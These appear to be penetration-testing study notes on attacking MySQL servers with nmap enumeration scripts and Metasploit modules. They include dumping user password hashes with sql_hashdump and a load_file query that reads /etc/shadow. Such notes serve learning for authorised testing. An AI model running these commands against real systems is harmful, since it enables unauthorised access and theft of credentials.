
### Using `nmap` to enumerate accounts with NULL password

```
nmap -p 3306 -sV <target-IP> --script mysql-empty-password
```

### Using `nmap` to enumerate SQL server info

```
nmap -p 3306 -sV <target-ip> --script mysql-info --script-args="mysqluser='root'"
```

### Using `nmap` to enumerate users

```
nmap -p 3306 -sV <target-ip> --script mysql-users --script-args
```

### Using `metasploit` to enumerate directories

- Metasploit module to enumerate writable directories in the system using MySQL:
```
use auxiliary/scanner/mysql/mysql_writable_dirs
```

- **WordList path** - /usr/share/metasploit-framework/data/wordlists/directory.txt
- Set verbosity to `false` to avoid getting spammed with too many messages. 
- To show more options use command `advanced`
- Instead of using `set <RHOSTS>`, we can use `setg <RHOSTS>` to set it as a global variable, so that we don't have to set it again when we switch to another module.

**How does this module work ?**

This Metasploit module doesn't enumerate directories in the traditional sense but rather checks if MySQL has write access to specific directories by executing SQL queries that attempt to create temporary files in those directories. If the MySQL server has the necessary permissions and access rights, it will allow the creation of files in those directories.

### Using `sql_hashdump` module

- Metasploit module to collect the hashes of different users who have access to the MySQL server from the user account information stored in the `mysql.user` table:
```
use auxiliary/scanner/mysql/sql_hashdump
```

### Using `mysql` to access sensitive files

- `mysql` command to access `/etc/shadow` file.
```
select load_file("/etc/shadow")
```

- *The `/etc/shadow` file keeps records about encrypted users' passwords, as well as other passwords related information.
